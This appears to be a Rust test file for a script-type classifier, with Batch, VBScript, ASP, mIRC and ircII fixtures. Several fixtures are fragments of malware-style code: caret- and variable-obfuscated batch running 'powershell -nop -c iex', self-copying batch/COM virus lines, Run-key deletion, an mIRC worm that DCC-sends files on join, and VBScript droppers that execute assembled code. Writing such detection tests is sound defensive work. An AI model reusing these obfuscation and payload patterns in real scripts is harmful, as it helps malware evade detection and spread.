use super::*;

fn verdict(text: &[u8]) -> Option<FileType> {
    evidence(text).verdict()
}

// ── Batch ────────────────────────────────────────────────────────────

#[test]
fn plain_batch_scripts() {
    let classic = b"@echo off\r\nsetlocal EnableDelayedExpansion\r\nset \"dir=%~dp0\"\r\n\
if not exist \"%dir%x.txt\" goto :missing\r\nfor /f \"tokens=*\" %%a in (list.txt) do echo %%a\r\n\
exit /b 0\r\n:missing\r\necho.\r\n";
    assert_eq!(verdict(classic), Some(FileType::Batch));
    // Lower case, no `@echo off`, labels and jumps.
    let dos = b"ctty nul\r\n:loop\r\nif exist c:\\x.com del c:\\x.com\r\ngoto loop\r\n";
    assert_eq!(verdict(dos), Some(FileType::Batch));
    // Commands whose switches and paths are cmd.exe's.
    let admin = b"rem # Remove StartUp Programs\r\n\r\nreg delete \"HKCU\\Software\\Run\" /f\r\n\r\nPAUSE\r\n";
    assert_eq!(verdict(admin), Some(FileType::Batch));
    let spam =
        b"start mspaint.exe\r\nstart mspaint.exe\r\nstart mspaint.exe\r\nstart mspaint.exe\r\n";
    assert_eq!(verdict(spam), Some(FileType::Batch));
}

/// Obfuscators spell every command through variables that expand to
/// nothing, and name them in any script they like.
#[test]
fn obfuscated_variable_splicing_is_batch() {
    let ascii = b"@%LZG%e%QMAPWH%c%ZME%h%HHYJEI%o%BIVRPR% o%JSSN%f%UBTZBO%f%HDAPAT%\r\n\
s%LDLSDS%e%RYYYZW%t%DNPH% l%RJUN%i%WUIB%n%ATVYR%k%JXA%=%UADDV%h%CRM%t%QLH%t%CORPD%p\r\n\
s%IVS%e%IEX%t%ZNP% m%KZT%a%GIML%n%BSZXZQ%g%EBW%o=1\r\n";
    assert_eq!(verdict(ascii), Some(FileType::Batch));
    let arabic = "@%\u{628}\u{64a}%e%\u{62d} \u{627}%c%\u{639}%h%\u{630}%o%\u{627} \u{644}% %\u{62d}%o%\u{627}%f%\u{629}%f%\u{639}%\r\n\
s%\u{644}%e%\u{628}%t%\u{631}% %\u{628}%x%\u{633}%=%\u{642}%1\r\n\
C%\u{627}%:%\u{639}%\\%\u{633}%W%\u{627}%i%\u{644}%n%\u{627}%d%\u{644}%o%\u{648}%w%\u{631}%s\\run.exe\r\n";
    assert_eq!(verdict(arabic.as_bytes()), Some(FileType::Batch));
}

/// `%var:~N,M%` takes one character of a key string; whole scripts are
/// assembled that way.
#[test]
fn substring_assembly_is_batch() {
    let data = "&@cls&@set \"_\u{c4}\u{c5}=fqv1OLEcr5T9Y3heGzNWFPu@iVb2oK\"\r\n\
%_\u{c4}\u{c5}:~23,1%%_\u{c4}\u{c5}:~7,1%%_\u{c4}\u{c5}:~15,1%%_\u{c4}\u{c5}:~2,1%\r\n\
%_\u{c4}\u{c5}:~9,1%%_\u{c4}\u{c5}:~4,1%%_\u{c4}\u{c5}:~18,1%\r\n";
    assert_eq!(verdict(data.as_bytes()), Some(FileType::Batch));
}

/// `^` escapes a character and continues a line; both hide keywords.
#[test]
fn caret_obfuscation_is_batch() {
    let data =
        b"@e^c^h^o o^f^f\r\nS^\r\nET x=%~dp0\r\np^o^w^e^r^s^h^e^l^l -nop -c \"iex x\" >nul\r\n";
    assert_eq!(verdict(data), Some(FileType::Batch));
}

/// Polyglots put the batch half first; the rest is data to cmd.exe.
#[test]
fn batch_hybrid_headers() {
    let jscript = b"@if (@X)==(@Y) @end /* JScript comment\r\n@echo off\r\n\
cscript //E:JScript //nologo \"%~f0\" %*\r\nexit /b %errorlevel%\r\n@if (@X)==(@Y) @end */\r\n\
var sh = new ActiveXObject(\"WScript.Shell\");\r\nWScript.Echo(WScript.ScriptName);\r\n\
if (WScript.Arguments.Length == 0) { WScript.Quit(0); }\r\n";
    assert_eq!(verdict(jscript), Some(FileType::Batch));
    let codesection = b"@if (@CodeSection == @Batch) @then\r\n\r\n@echo off & setlocal\r\n\
cscript /nologo /e:JScript \"%~f0\" %*\r\ngoto :EOF\r\n@end\r\nvar x = WSH.CreateObject('htmlfile');\r\n";
    assert_eq!(verdict(codesection), Some(FileType::Batch));
    let wsf = b"<!-- : Begin batch script\r\n@setlocal DisableDelayedExpansion\r\n@echo off\r\n\
cscript //nologo \"%~f0?.wsf\"\r\nexit /b\r\n----- Begin wsf script --->\r\n<job><script language=\"VBScript\">\r\n\
Set sh = CreateObject(\"WScript.Shell\")\r\nWScript.Echo sh.CurrentDirectory\r\n</script></job>\r\n";
    assert_eq!(verdict(wsf), Some(FileType::Batch));
    let iexpress = b";@echo off\r\n;setlocal\r\n;set \"message=click OK\"\r\n;del /q /f %tmp%\\yes >nul 2>&1\r\n\
[Version]\r\nClass=IEXPRESS\r\nSEDVersion=3\r\n";
    assert_eq!(verdict(iexpress), Some(FileType::Batch));
}

/// A BAT/COM hybrid opens with its batch lines; a DOS program that drops
/// a batch file carries those lines in its data.
#[test]
fn binary_windows_need_batch_at_the_top() {
    let mut hybrid = b"REM  \xeb\x42\r\n@echo off\r\ngoto bvc\r\n".to_vec();
    hybrid
        .extend_from_slice(&[0xB4, 0x4E, 0x00, 0x01, 0xCD, 0x21, 0x00, 0x02, 0x00, 0x03].repeat(8));
    hybrid.extend_from_slice(
        b"\r\n:bvc\r\nif not exist %0 goto end\r\ncopy /b %0+%0.bat x.com>NUL\r\n",
    );
    assert_eq!(verdict(&hybrid), Some(FileType::Batch));

    let mut program = [
        0xE9u8, 0x10, 0x01, 0x00, 0xB4, 0x4E, 0xCD, 0x21, 0x00, 0x00, 0x05,
    ]
    .repeat(12);
    program.extend_from_slice(
        b"\n@Ctty Nul\nFor %%F In (*.Bat) Do Copy %0.BAT %%F\nCtty Con\x00\x00*.COM\x00",
    );
    assert_eq!(verdict(&program), None);
}

/// ANSI colour in `echo` lines is text, not object code.
#[test]
fn ansi_escapes_do_not_make_batch_binary() {
    let data = b"@echo off\r\necho \x1b[44m\x1b[3mCheck Activation Status\x1b[0m\r\necho.\r\n\
set \"k=%~1\"\r\nif \"%k%\"==\"\" goto :eof\r\n";
    assert_eq!(verdict(data), Some(FileType::Batch));
}

#[test]
fn neighbours_of_batch_are_not_batch() {
    // Makefile recipes are tab-indented, and a diff puts them behind a
    // context space.
    let makefile = b"PROJ_NAME=hades\nBUILD_PATH=${CURDIR}/dist\n\n.PHONY: help\nhelp:\n\t@echo -e \"Usage:\"\n\
\t@sed -n 's/^##//p' ${MAKEFILE_LIST}\n\t@echo\n";
    assert_eq!(verdict(makefile), None);
    let diff = b"--- a/Makefile\n+++ b/Makefile\n@@ -1,6 +1,6 @@\n \t@echo\n \t@echo \"If none of these match\"\n \t@echo\n-CFLAGS=-O\n+CFLAGS=-O2\n";
    assert_eq!(verdict(diff), None);
    // Vim script shares `setlocal`, `set x=y`, `call` and `echo`.
    let vim = b"\" Vim filetype plugin\nif exists(\"b:did_ftplugin\")\n  finish\nendif\nlet b:did_ftplugin = 1\n\
setlocal ts=4 sw=4 noexpandtab\nset tw=78\nsetlocal commentstring=#%s\ncall s:Setup()\necho \"done\"\n";
    assert_eq!(verdict(vim), None);
    // `:name` is an EDN keyword and a Vim Ex command, not only a label.
    let edn = b"{:blocks (\n{:block/created-at 1668430323592\n:block/properties\n{:ls-type :whiteboard-shape\n:index 24\n:handles\n:end\n:decorations\n:scale [1 1]\n";
    assert_eq!(verdict(edn), None);
    let vimdoc = b"Example: >\n\t:for item in mylist\n\t:   call Doit(item)\n\t:endfor\n\t:function! Foo()\n\t:endfunction\n<\nMore prose follows here.\n";
    assert_eq!(verdict(vimdoc), None);
    // A shell `date` format is not a `%var%` reference.
    let shell = b"#!/bin/sh\nmkdir -p $LOOT_DIR 2> /dev/null\necho \"$TARGET `date +\"%Y-%m-%d %H:%M\"`\" >> $LOOT_DIR/tasks.txt\n\
cd $DIR && echo \"started\"\nexit 0\n";
    assert_eq!(verdict(shell), None);
    // Minified JavaScript has `) ... else` on the same line.
    let js =
        b")) {(function(){function e(t,r){try{e()}catch(n){t&&t()}}if(x){y()}else{z()}})();}\n\
)) {Date.now=function e(){return(new Date).getTime()};}\n";
    assert_eq!(verdict(js), None);
    // BitchX's colour codes look like `%var%` pairs.
    let bitchx = b"%gUsage%n: %W/%nBHelp %Y<%nTopic%G|%nIndex%Y>%n\n%YTopic%n - This gives help on %Y<%nTopic%Y>%n\n\
%gUsage%n: %W/%n4op %Y<%Cnick%Y>%n\n%Ghint%n: Set %RAUTO_AWAY%n to set /away when idling\n";
    assert_eq!(verdict(bitchx), None);
}

/// A script that writes a batch file quotes batch; its own lines decide.
#[test]
fn vbscript_writing_batch_is_vbscript() {
    let data =
        b"Option Explicit\r\nDim fso : Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\n\
WriteFile \"@echo off\", cmd_path\r\nWriteFile \"set errorlevel=\", cmd_path\r\n\
WriteFile \"if %errorlevel% EQU 1 exit /b 0\", cmd_path\r\nIf fso.FileExists(cmd_path) Then\r\n\
  WScript.Echo \"written\"\r\nEnd If\r\n";
    assert_eq!(verdict(data), Some(FileType::Vbs));
}

// ── VBScript ─────────────────────────────────────────────────────────

#[test]
fn plain_vbscript() {
    let data = b"On Error Resume Next\r\nDim fso, sh\r\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\r\n\
Set sh = CreateObject(\"WScript.Shell\")\r\nIf Not fso.FileExists(\"c:\\x.txt\") Then\r\n\
  sh.Run \"cmd /c whoami\", 0, True\r\nEnd If\r\nFor Each f In fso.GetFolder(\".\").Files\r\n  WScript.Echo f.Name\r\nNext\r\n";
    assert_eq!(verdict(data), Some(FileType::Vbs));
    // Lower case works the same.
    let lower = b"on error resume next\ndim ws\nset ws = wscript.createobject(\"wscript.shell\")\nws.run \"shutdown -r -t 1\",0,true\n";
    assert_eq!(verdict(lower), Some(FileType::Vbs));
}

#[test]
fn vbscript_one_liners() {
    assert_eq!(
        verdict(b"MsgBox \"Hello, World!\", vbOKOnly, \"Greetings\"\r\n"),
        Some(FileType::Vbs)
    );
    assert_eq!(
        verdict(b"Dim patriarchium, Geometridae \r\n"),
        Some(FileType::Vbs)
    );
    assert_eq!(verdict(b"do\nmsgbox \"hi\"\nloop\n"), Some(FileType::Vbs));
    // Statements chained with `:`, a call continued with `_`.
    let chained =
        b"rL=\"ri\":fM=\"tp\":k=\"sC\"&rL&\"pt:ht\"&fM&\"s://\":k=k&\"example\":Getobject(_\nk)\n";
    assert_eq!(verdict(chained), Some(FileType::Vbs));
}

/// `:` separates statements, so obfuscators pad with thousands of them.
#[test]
fn colon_padded_vbscript() {
    let mut data = b":\r\n::\r\n".repeat(5000);
    data.extend_from_slice(
        b":::::On Error Resume Next:::junkjunk :::::\r\nzzzzqqqq\r\n\
:::Dim a, b:::\r\n::Set a = CreateObject(\"WScript.Shell\")::\r\n::a.Run b, 0::\r\n",
    );
    assert_eq!(verdict(&data), Some(FileType::Vbs));
}

/// Data-heavy droppers are mostly VB-only assignment forms.
#[test]
fn vbscript_assignment_forms() {
    let mut data =
        b"On Error Resume Next\r\nDim dataList(101), listIndex, compiledCode\r\n".to_vec();
    for i in 0..60 {
        data.extend_from_slice(
            format!("dataList({i}) = Array(\"Omb\", \"pouse\", \"tmb\")\r\n").as_bytes(),
        );
    }
    data.extend_from_slice(b"compiledCode = compiledCode & \"x\"\r\nExecute compiledCode\r\n");
    assert_eq!(verdict(&data), Some(FileType::Vbs));
}

#[test]
fn vb_net_is_the_vb_family() {
    let data = b"Namespace Antis\r\n    Public Class AntiVM\r\n        Public Sub ST(ByVal File As String)\r\n\
            Try\r\n                If IO.File.Exists(\"vmGuestLib.dll\") Then D(File)\r\n            Catch : End Try\r\n\
        End Sub\r\n    End Class\r\nEnd Namespace\r\n";
    assert_eq!(verdict(data), Some(FileType::Vbs));
}

/// Scripts pasted from web pages carry Unicode spaces between words.
#[test]
fn unicode_spaces_between_words() {
    let data = "'\u{2002}Connect\u{2002}to\u{2002}a\u{2002}database\n\nSet\u{2002}objConn\u{2002}=\u{2002}CreateObject(\"ADODB.Connection\")\n\
Set\u{2002}ors\u{2002}=\u{2002}objConn.Execute(\"select\u{a0}*\")\nDo\u{2002}While\u{2002}Not(ors.EOF)\n  ors.MoveNext\nLoop\n";
    assert_eq!(verdict(data.as_bytes()), Some(FileType::Vbs));
}

#[test]
fn vbscript_in_pages() {
    let asp = b"<%@codepage=936%><%Response.Expires=0\r\non error resume next\r\nsub eg:Response.end:end sub\r\n\
function ee(g):response.write g:end function\r\nDim x : x = Request(\"a\")\r\n%>\r\n";
    assert_eq!(verdict(asp), Some(FileType::Asp));
    let page = b"<html><head><title>x</title></head>\r\n<script language=\"VBScript\">\r\nOn Error Resume Next\r\n\
Set sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"calc\"\r\n</script></html>\r\n";
    assert_eq!(verdict(page), Some(FileType::Html));
    // A VBScript that only mentions markup in a string is still VBScript.
    let writer = b"Option Explicit\r\nDim f : Set f = CreateObject(\"Scripting.FileSystemObject\")\r\n\
f.CreateTextFile(\"x.htm\").WriteLine \"<html><body>hi</body></html>\"\r\nWScript.Echo \"<% not asp %>\"\r\n";
    assert_eq!(verdict(writer), Some(FileType::Vbs));
}

#[test]
fn neighbours_of_vbscript_are_not_vbscript() {
    // AppleScript closes `if` the same way and says everything else its
    // own way.
    let applescript = b"if application \"VOX\" is running then\n\ttell application \"VOX\"\n\t\tif player state is 1 then\n\
\t\t\tnext\n\t\tend if\n\tend tell\nend if\n";
    assert_eq!(verdict(applescript), None);
    let stealer = b"on filesizer(paths)\n\tset fsz to 0\n\ttry\n\t\tset theItem to quoted form of POSIX path of paths\n\
\t\tset fsz to (do shell script \"mdls \" & theItem)\n\tend try\n\treturn fsz\nend filesizer\n";
    assert_eq!(verdict(stealer), None);
    // Lua writes `if ... then` with `==` and closes with a bare `end`.
    let lua = b"local function f(x)\n  if x == nil then\n    return 0\n  elseif x.y then\n    return 1\n  end\nend\n";
    assert_eq!(verdict(lua), None);
    // JScript calls the same host objects.
    let scriptlet = b"<?XML version=\"1.0\"?>\n<scriptlet>\n<script language=\"JScript\">\n\
new ActiveXObject(\"WScript.Shell\").Run(ps,0,true);\n</script>\n</scriptlet>\n";
    assert_eq!(verdict(scriptlet), None);
    // "Dim the lights" is two words, not a declaration list.
    assert_eq!(verdict(b"Dim the lights\nand close the door\n"), None);
}

// ── mIRC ─────────────────────────────────────────────────────────────

#[test]
fn mirc_scripts() {
    let remote =
        b"on 10:TEXT:*:*:{\n  if ($1 == !quit) && ($address == %master) { /msg # bye | /quit }\n\
  if ($1 == !up) { mode # +o $nick }\n}\n";
    assert_eq!(verdict(remote), Some(FileType::Mirc));
    let saved = b"[script]\r\nn0=on 1:JOIN:#:{ /dcc send $nick c:\\x.com }\r\nn1=on 1:PART:#:{ .msg $nick bye }\r\n";
    assert_eq!(verdict(saved), Some(FileType::Mirc));
    let aliases =
        b"alias xspread {\r\n  .write x-.bat net view > x-.txt\r\n  .timersx 1 20 xcopy1\r\n}\r\n\
alias xcopy1 {\r\n  if ($lines(x-.txt) < 6) { halt }\r\n}\r\n";
    assert_eq!(verdict(aliases), Some(FileType::Mirc));
    // mIRC colour and bold codes are text.
    let coloured =
        b"on 1:TEXT:!status:#:{\n  /msg # \x0314[\x0315Clone Status\x0314]\x02 $sock(c*,0) \x0f\n\
  /msg # \x034up\x03 $+ $uptime\n  inc %count\n}\n";
    assert_eq!(verdict(coloured), Some(FileType::Mirc));
}

#[test]
fn neighbours_of_mirc_are_not_mirc() {
    // A Java method chain is not a silent mIRC command.
    let java = b"contextRunner.withUserConfiguration(A.class)\n    .run((context) -> assertThat(context).hasSingleBean(B.class));\n\
    .run((context) -> assertThat(context).hasFailed());\n}\n";
    assert_eq!(verdict(java), None);
    // A VBScript that writes a mIRC script quotes the header mid-line.
    let worm = b"On Error Resume Next\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\
scriptini.WriteLine \"n0=on 1:JOIN:#:{\"\nscriptini.WriteLine \"n1=/dcc send $nick x.vbs\"\n";
    assert_eq!(verdict(worm), Some(FileType::Vbs));
}

// ── ircII ────────────────────────────────────────────────────────────

#[test]
fn ircii_scripts() {
    let epic = b"# tab key nickname completion\nbind ^I parse_command ^tk.getmsg 1 $tk.msglist\n\
alias tk.addmsg {\n\t@ tk.matched = rmatch($0 $^\\1-)\n\tif (tk.matched)\n\t{\n\t\t@ tk.msglist = [$(0-${tk.matched-1})]\n\t}\n\
\t^assign -tk.matched\n}\non #-msg 55 * ^tk.addmsg $0 $tk.msglist\n";
    assert_eq!(verdict(epic), Some(FileType::IrcII));
    let bitchx = b"on -nickname \"*\" {\n  if ( querywin($0) > 0 ) {\n    @ winnum = querywin($0)\n    xeval -win $winnum {\n      query $1\n    }\n  }\n}\n";
    assert_eq!(verdict(bitchx), Some(FileType::IrcII));
    let slashed = b"/set dcc_autoget on\n/set auto_away off\n/alias fhelp {/tcl echohelp;}\n/alias fson {/tcl fserveon;}\n";
    assert_eq!(verdict(slashed), Some(FileType::IrcII));
    let aliases =
        b"alias mr msg $, $*\nalias ma msg $. $*\nalias wa whois $.\nalias d- ^set display off\n";
    assert_eq!(verdict(aliases), Some(FileType::IrcII));
}

#[test]
fn ircii_needs_its_own_syntax() {
    // English starts sentences with "On" and an event-like word.
    let prose = b"On public holidays the office is closed.\nOn join, new staff get a badge.\nOn msg boards, be civil.\n";
    assert_eq!(verdict(prose), None);
    // The brace form alone belongs to neither client.
    assert_eq!(verdict(b"alias hi {\n  echo hello\n}\n"), None);
}

// ── Line reading ─────────────────────────────────────────────────────

#[test]
fn classic_mac_line_endings() {
    let data =
        b"on error resume next\rdim a\rset a = createobject(\"wscript.shell\")\ra.run \"calc\"\r";
    assert_eq!(verdict(data), Some(FileType::Vbs));
}

/// A payload in front of the script does not hide it.
#[test]
fn one_line_tail_is_not_a_line() {
    // One minified line of Lua, far longer than both windows. The tail cut
    // lands inside `s`, so a reader starting there sees every quote
    // inverted and the `:` in `t` as a statement separator, leaving a bare
    // `if v<1 then` -- a strong VBScript line.
    let mut data = b"local s=\"".to_vec();
    data.resize(data.len() + 3 * WINDOW, b'A');
    data.extend_from_slice(b"\";local t=\"a:if v<1 then y=2 end\"");
    assert_eq!(verdict(&data), None);
}

#[test]
fn code_after_a_payload_is_read() {
    // Padding a VBScript can run: comment lines.
    let mut data = [&b"'"[..], &[b'Q'; 80], b"\r\n"]
        .concat()
        .repeat(3 * WINDOW / 83);
    data.extend_from_slice(
        b"On Error Resume Next\r\nDim sh\r\nSet sh = CreateObject(\"WScript.Shell\")\r\n\
sh.Run \"powershell -nop\", 0\r\nWScript.Sleep 1000\r\n",
    );
    assert_eq!(verdict(&data), Some(FileType::Vbs));
}
